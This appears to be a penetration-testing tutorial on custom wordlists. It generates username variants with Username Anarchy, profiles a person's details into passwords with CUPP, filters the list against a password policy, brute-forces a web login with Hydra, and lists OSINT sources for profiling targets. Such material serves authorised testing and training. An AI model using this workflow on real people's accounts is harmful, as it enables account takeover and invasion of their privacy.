# Custom Wordlists

Generic wordlists cast a wide net but are fundamentally inefficient against specific targets. A person's actual username is unlikely to appear in a 10-million-entry dataset collected from unrelated breaches. Custom wordlists flip the approach: instead of broad coverage, you build a narrow, highly relevant list from intelligence gathered about the specific target.

***

## Username Anarchy

Username Anarchy generates every plausible username variation from a person's name, accounting for the full range of corporate naming conventions without any guesswork:

```bash
# Install
sudo apt install ruby -y
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy

# Generate username list for a target
./username-anarchy Jane Smith > jane_smith_usernames.txt
```

The output covers every realistic format an IT department might have assigned:

| Format | Example Output |
|--------|---------------|
| `first` | jane |
| `firstlast` | janesmith |
| `first.last` | jane.smith |
| `flast` | jsmith |
| `f.last` | j.smith |
| `lastf` | smithj |
| `last.first` | smith.jane |
| `FLast` | JSmith |
| `FirstLast` | JaneSmith |
| `fmlast` (with middle) | jabsmith |

A name like "Jane Smith" produces around 14 usable variations. For a target with a known middle name, the list expands further. This is far more targeted than pulling a generic username list and hoping for a match.

***

## CUPP: Common User Passwords Profiler

CUPP builds a password wordlist from personal intelligence about the target, exploiting the reality that most people use personally meaningful words as passwords:

```bash
# Install
sudo apt install cupp -y

# Interactive mode
cupp -i
```

CUPP's interactive prompts guide you through every piece of relevant information:

```
First Name:      Jane
Surname:         Smith
Nickname:        Janey
Birthdate:       11121990
Partner name:    Jim
Partner nickname: Jimbo
Partner DOB:     12121990
Pet name:        Spot
Company:         AHI
Keywords:        hacker,blue
Special chars:   Y
Random numbers:  Y
Leet mode:       Y
```

From this profile, CUPP generates mutations including:

- Base words: `jane`, `smith`, `spot`, `janey`
- Capitalised: `Jane`, `Smith`, `Spot`
- Date variations: `jane1211`, `smith1990`, `jane11121990`
- Concatenations: `janesmith`, `janespot`, `janeahi`
- Special character appends: `jane!`, `smith@`, `spot#`
- Numeric appends: `jane123`, `smith2024`
- Leetspeak: `j4n3`, `5m1th`, `sp0t`
- Combined: `Jane1990!`, `Sp0t@2024`

The result is roughly 46,000 candidates, far more relevant to this specific target than any generic list.

***

## Filtering Against Password Policy

A raw CUPP output is too large and contains entries that will never satisfy the target organisation's policy. The grep pipeline reduces it to only compliant candidates:

```bash
grep -E '^.{6,}$' jane.txt |          # Min 6 characters
grep -E '[A-Z]' |                      # At least one uppercase
grep -E '[a-z]' |                      # At least one lowercase
grep -E '[0-9]' |                      # At least one digit
grep -E '([!@#$%^&*].*){2,}' \        # At least two special chars
> jane-filtered.txt
```

The regex `([!@#$%^&*].*){2,}` deserves explanation. It matches any string where the pattern "a special character followed by anything" occurs at least twice, which effectively ensures at least two special characters exist anywhere in the string. This reduces 46,000 entries to roughly 7,900, a 83% reduction before sending a single request.

***

## Combining Both Lists in Hydra

```bash
hydra -L jane_smith_usernames.txt \
      -P jane-filtered.txt \
      TARGET_IP \
      -s PORT \
      -f \
      http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
```

With 14 usernames and 7,900 passwords, Hydra runs 110,600 total attempts (14 x 7,900). Compare that to using a generic list: `xato-net-10-million-usernames.txt` against `rockyou.txt` would produce billions of attempts. The custom approach is orders of magnitude more efficient and, critically, more likely to succeed because the actual password is almost certainly in the CUPP output if the OSINT was thorough.

***

## OSINT Sources for Building Target Profiles

The quality of the CUPP output depends entirely on the quality of intelligence gathered beforehand. The best sources for building a target profile:

| Source | What It Reveals |
|--------|----------------|
| LinkedIn | Job titles, companies, colleagues, dates |
| Facebook / Instagram | Birthdays, relationships, pets, interests, location |
| Twitter / X | Hobbies, opinions, nicknames, favourite media |
| Company website | Department, role, email format inference |
| Public records | Address, family names, property |
| Have I Been Pwned | Previous breached passwords for the same email |
| GitHub | Personal projects, interests, sometimes leaked credentials |

The more complete the profile, the higher the probability that the target's actual password appears in the generated list. This technique is most effective against individuals who have a significant public online presence and who have not adopted a password manager.
